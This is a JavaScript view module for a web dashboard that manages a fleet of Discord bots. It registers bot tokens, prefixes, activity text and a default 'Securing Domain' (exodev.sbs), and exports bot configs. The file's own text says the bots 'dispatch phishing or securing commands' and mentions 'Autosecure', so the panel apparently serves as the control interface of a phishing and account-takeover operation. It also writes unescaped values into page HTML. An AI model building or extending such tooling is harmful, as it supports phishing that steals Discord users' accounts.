// Bot Fleet Manager View Module
const BotsView = {
  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = `
      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="fas fa-robot"></i> Bot Fleet Manager</span>
          <div style="display:flex;gap:8px;">
            <button class="btn btn-primary btn-sm" onclick="BotsView.openAddBotModal()">
              <i class="fas fa-plus"></i> Add New Bot
            </button>
          </div>
        </div>

        <div class="card-body">
          <div id="bots-stats-row" style="margin-bottom:20px;"></div>
          <div id="bots-table-container">
            <div style="text-align:center;padding:30px;"><i class="fas fa-spinner fa-spin fa-2x"></i></div>
          </div>
        </div>
      </div>
    `;

    await this.loadBots();
  },

  async loadBots() {
    const tableContainer = document.getElementById('bots-table-container');
    const statsRow = document.getElementById('bots-stats-row');
    if (!tableContainer) return;

    try {
      const res = await API.get('/api/bots');
      const { bots, usedSlots, maxSlots } = res.data;

      statsRow.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:rgba(255,255,255,0.02);border:1px solid var(--border-color);border-radius:var(--radius-md);">
          <div>
            <span style="color:var(--text-dim);font-size:0.8rem;">Allocated Bot Slots:</span>
            <span style="font-weight:700;font-size:1.1rem;margin-left:8px;color:${usedSlots >= maxSlots ? '#fbbf24' : '#34d399'};">
              ${usedSlots} / ${maxSlots} Slots Used
            </span>
          </div>
          <div>
            <span class="badge-tag info">Multi-Bot Synchronized</span>
          </div>
        </div>
      `;

      if (!bots.length) {
        tableContainer.innerHTML = `
          <div style="text-align:center;padding:40px;color:var(--text-dim);">
            <i class="fas fa-robot fa-3x" style="margin-bottom:12px;opacity:0.4;"></i>
            <h4>No bots currently registered</h4>
            <p style="font-size:0.85rem;margin-top:6px;">Add a Discord bot token to dispatch phishing or securing commands.</p>
          </div>
        `;
        return;
      }

      tableContainer.innerHTML = `
        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Bot #</th>
                <th>Prefix</th>
                <th>Domain</th>
                <th>Server ID</th>
                <th>Status / Activity</th>
                <th style="text-align:right;">Actions</th>
              </tr>
            </thead>
            <tbody>
              ${bots.map(b => `
                <tr>
                  <td>
                    <span class="badge-tag primary" style="font-size:0.8rem;">Bot #${b.botnumber || b.id}</span>
                  </td>
                  <td><code>${b.prefix || 'old'}</code></td>
                  <td>${b.domain || 'exodev.sbs'}</td>
                  <td style="font-family:var(--font-mono);font-size:0.75rem;">${b.server_id || 'Global'}</td>
                  <td>
                    <span style="font-size:0.8rem;color:var(--text-muted);">${b.activity || 'Playing /help'}</span>
                  </td>
                  <td style="text-align:right;">
                    <div class="btn-group" style="justify-content:flex-end;">
                      <button class="btn btn-secondary btn-sm" onclick="BotsView.editActivity(${b.id}, '${b.activity || ''}')" title="Edit Activity">
                        <i class="fas fa-edit"></i>
                      </button>
                      <button class="btn btn-secondary btn-sm" onclick="BotsView.exportConfig(${b.id})" title="Export Config">
                        <i class="fas fa-file-code"></i>
                      </button>
                      <button class="btn btn-danger btn-sm" onclick="BotsView.deleteBot(${b.id})" title="Delete Bot">
                        <i class="fas fa-trash"></i>
                      </button>
                    </div>
                  </td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      `;
    } catch (err) {
      tableContainer.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  openAddBotModal() {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">Discord Bot Token *</label>
        <input type="password" id="add-bot-token" class="form-input" placeholder="OTk3..." required />
      </div>
      <div class="form-group">
        <label class="form-label">Command Prefix</label>
        <input type="text" id="add-bot-prefix" class="form-input" value="old" placeholder="e.g. old or !" />
      </div>
      <div class="form-group">
        <label class="form-label">Securing Domain</label>
        <input type="text" id="add-bot-domain" class="form-input" value="exodev.sbs" />
      </div>
      <div class="form-group">
        <label class="form-label">Default Activity Text</label>
        <input type="text" id="add-bot-activity" class="form-input" placeholder="e.g. Protecting accounts" />
      </div>
    `;

    Modal.open({
      title: 'Register Discord Bot',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BotsView.submitAddBot()">Add Bot</button>
      `
    });
  },

  async submitAddBot() {
    const token = document.getElementById('add-bot-token').value.trim();
    const prefix = document.getElementById('add-bot-prefix').value.trim();
    const domain = document.getElementById('add-bot-domain').value.trim();
    const activity = document.getElementById('add-bot-activity').value.trim();

    if (!token) return Toasts.warning('Bot token required');

    try {
      await API.post('/api/bots', { token, prefix, domain, activity });
      Modal.close();
      Toasts.success('Bot registered successfully!');
      this.loadBots();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  editActivity(botId, currentActivity) {
    const bodyHtml = `
      <div class="form-group">
        <label class="form-label">New Activity Text</label>
        <input type="text" id="edit-bot-activity" class="form-input" value="${currentActivity}" placeholder="Playing with Autosecure" />
      </div>
    `;

    Modal.open({
      title: 'Edit Bot Activity',
      bodyHtml,
      footerHtml: `
        <button class="btn btn-secondary" onclick="Modal.close()">Cancel</button>
        <button class="btn btn-primary" onclick="BotsView.submitEditActivity(${botId})">Save</button>
      `
    });
  },

  async submitEditActivity(botId) {
    const activity = document.getElementById('edit-bot-activity').value.trim();
    try {
      await API.put(`/api/bots/${botId}/activity`, { activity });
      Modal.close();
      Toasts.success('Activity updated!');
      this.loadBots();
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async exportConfig(botId) {
    try {
      const res = await API.get(`/api/bots/${botId}/config`);
      const json = JSON.stringify(res.config, null, 2);

      Modal.open({
        title: `Bot Config Export (#${botId})`,
        bodyHtml: `
          <pre style="font-family:var(--font-mono);font-size:0.8rem;background:rgba(0,0,0,0.3);padding:14px;border-radius:4px;max-height:350px;overflow-y:auto;">${json}</pre>
        `,
        footerHtml: `
          <button class="btn btn-secondary" onclick="API.copyText(\`${json.replace(/`/g, '\\`')}\`, 'Config JSON')">Copy JSON</button>
          <button class="btn btn-primary" onclick="Modal.close()">Close</button>
        `
      });
    } catch (err) {
      Toasts.error(err.message);
    }
  },

  async deleteBot(botId) {
    if (!confirm('Are you sure you want to delete this bot slot?')) return;
    try {
      await API.delete(`/api/bots/${botId}`);
      Toasts.success('Bot removed');
      this.loadBots();
    } catch (err) {
      Toasts.error(err.message);
    }
  }
};

window.BotsView = BotsView;
